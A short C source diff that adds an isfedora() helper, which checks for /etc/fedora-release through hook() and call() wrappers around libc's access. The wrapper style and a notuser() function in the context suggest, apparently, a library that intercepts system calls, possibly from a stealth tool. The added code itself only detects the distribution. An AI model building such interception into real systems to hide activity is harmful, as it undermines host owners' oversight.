@@ -26,6 +26,15 @@ int notuser(uid_t id){
     return 0;
 }
 
+int isfedora(void){
+    int fedora=0;
+    hook(CACCESS);
+    fedora = (long)call(CACCESS, "/etc/fedora-release", F_OK);
+    if(fedora == 0)
+        return 1;
+    return 0;
+}
+
 char *gdirname(int fd){
     int readlink_status;
     char path[128], *filename = malloc(PATH_MAX+1);
